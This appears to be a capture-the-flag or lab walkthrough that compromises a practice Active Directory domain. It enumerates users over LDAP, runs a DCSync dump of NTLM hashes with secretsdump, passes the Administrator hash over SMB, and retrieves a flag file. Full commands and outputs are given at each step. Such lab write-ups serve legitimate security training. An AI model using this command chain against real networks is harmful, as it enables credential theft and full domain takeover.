### Our first mission is: Enumerate domain accounts and identify misconfigured operational privileges

Blueprint:
`nxc [1. Protocol] [2. Target IP] -u [3. Username] -p [4. Password] --base-dn [5. Search Anchor] [6. Enumeration Target]`

Command:

```bash
nxc ldap 192.168.56.20 -u svc_app -p 'AppServ1ce!' --base-dn "DC=PENTESTLAB,DC=local" --users

```

Explanation:

`ldap`: Specifies the target protocol component inside NetExec to communicate with the Active Directory directory service over port 389.

`192.168.56.20`: The network destination target hosting the Domain Controller services.

`-u svc_app -p 'AppServ1ce!'`: The authentication handle pair supplying a known valid low-privileged service account identity and credential string to bind to the directory.

`--base-dn "DC=PENTESTLAB,DC=local"`: Dictates the starting point or absolute root folder path within the directory tree topology to query objects from.

`--users`: Instructs NetExec to dump all accessible domain user account objects and automatically parse common decorative attributes like `description` or `comment`.

Brief Explanation:

> "Establish an authenticated LDAP connection to the server at 192.168.56.20 using the low-level service account 'svc_app' and its password. Once logged in, scan from the top-level folder of the PENTESTLAB.local domain structure and retrieve all user objects. Pull down their standard profile details and display them cleanly so we can analyze the description strings for administrative misconfigurations or leaked capabilities."

Output:

```text
LDAP        192.168.56.20   389    DC01            svc_backup                    2026-04-22 04:43:46 0       Backup Service Account - Has DCSync rights

```

---

### Our Second Mission is: Abuse replication privileges via a DCSync attack to extract domain secrets

Blueprint:
`impacket-secretsdump [1. Domain]/[2. Privileged User]:[3. Password]@[4. Target DC IP]`

Command:

```bash
impacket-secretsdump PENTESTLAB.local/svc_backup:Password1@192.168.56.20

```

Explanation:

`PENTESTLAB.local/svc_backup:Password1`: Supplies the domain context, username, and authentication password for the highly privileged service account identified during enumeration.

`@192.168.56.20`: Points the tools directly to the target Domain Controller holding the replication endpoints.

Brief Explanation:

> "Authenticate remotely to the Domain Controller using the compromised 'svc_backup' account. Instead of attempting to execute commands on the machine or access its local drive, leverage its special synchronization privileges to impersonate an official backup Domain Controller. Request the primary directory database secrets using the legitimate DRSUAPI replication protocol, pulling down the cryptographic NT password hashes for every identity across the domain environment."

Output:

```text
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:217e50203a5aba59cefa863c724bf61b:::

[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:b817733bdc947930b700cc2e567fb3ad:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:5bc68a017e37f5da683a3e4128630abc:::

```

*(Note: The second Administrator entry extracted via DRSUAPI represents the universal Domain Administrator identity stored inside `ntds.dit`)*

---

### Our Third mission is: Execute a Pass-the-Hash attack to enumerate accessible administrative network shares

Blueprint:
`nxc [1. Protocol] [2. Target IP] -u [3. Target User] -H [4. NTLM Hash] [5. Operational Flag]`

Command:

```bash
nxc smb 192.168.56.20 -u Administrator -H 'aad3b435b51404eeaad3b435b51404ee:b817733bdc947930b700cc2e567fb3ad' --shares

```

Explanation:

`smb`: Switches the protocol engine to Server Message Block (SMB) targeting ports 445/139 to audit file sharing controls and administrative access permissions.

`-u Administrator`: Specifies the targeted user context we are impersonating—in this case, the high-value Domain Administrator account.

`-H 'aad3b435b51404eeaad3b435b51404ee:b817733bdc947930b700cc2e567fb3ad'`: Supplies the full cryptographic NTLM string (LM:NT). This triggers Pass-the-Hash (PtH) functionality, satisfying the challenge-response protocol without needing or cracking the raw plaintext password.

`--shares`: Instructs NetExec to scan, query, and output all configured network directories and explicitly define our read/write permission levels on each folder.

Brief Explanation:

> "Initiate a connection to the file-sharing service of the Domain Controller at 192.168.56.20. Attempt to authenticate as the Domain Administrator by passing the captured NT hash directly into the network handshake sequence. Once access is verified, query the system configuration to list all hidden and standard network directories, showing which restricted vaults we now have access to read."

Output:

```text
SMB         192.168.56.20   445    DC01             [+] PENTESTLAB.local\Administrator:b817733bdc947930b700cc2e567fb3ad (Pwn3d!)
SMB         192.168.56.20   445    DC01             [*] Enumerated shares
SMB         192.168.56.20   445    DC01             Share           Permissions     Remark
SMB         192.168.56.20   445    DC01             -----           -----------     ------
SMB         192.168.56.20   445    DC01             AdminProof      READ            

```

---

### Our Last mission is: Authenticate to the restricted share context using the hash to read the hidden flag

Blueprint:
`smbclient [1. Target Share Path] -U [2. Username]%[3. NTLM Hash] [4. Authentication Type]`

Command:

```bash
smbclient //192.168.56.20/AdminProof -U Administrator%aad3b435b51404eeaad3b435b51404ee:b817733bdc947930b700cc2e567fb3ad --pw-nt-hash

```

Explanation:

`//192.168.56.20/AdminProof`: The absolute UNC structural path pointing to the non-standard, restricted network directory discovered during the share map phase.

`-U Administrator%[Hash]`: Explicit user binding string that chains the username and the NTLM credential together using a percentage (`%`) separator.

`--pw-nt-hash`: Explicitly tells `smbclient` that the alphanumeric sequence provided inside the user string is an NTLM hash rather than a standard cleartext password value.

Brief Explanation:

> "Spawn an interactive SMB console connecting straight into the protected 'AdminProof' directory on the target server. Log in automatically by leveraging the Domain Administrator's NT hash. Once inside the remote directory environment, list the stored files, safely clone the target documentation asset down to our local execution path, and read the sensitive contents."

Interaction Workflow & Retrieval:

```text
smb: \> ls
  .                                   D        0  Mon Apr 20 05:29:49 2026
  ..                                  D        0  Mon Apr 20 05:29:49 2026
  flag.txt                            A       74  Tue Apr 21 04:50:09 2026

smb: \> get flag.txt
getting file \flag.txt of size 74 as flag.txt (2.1 KiloBytes/sec) (average 2.1 KiloBytes/sec)

smb: \> exit

┌──(root㉿kali)-[~]
└─# cat flag.txt   
FLAG_M2_T4{720d1ee8dff44fb50405480f1599512bdde8c20e956c98e14c4985bc653a}

```
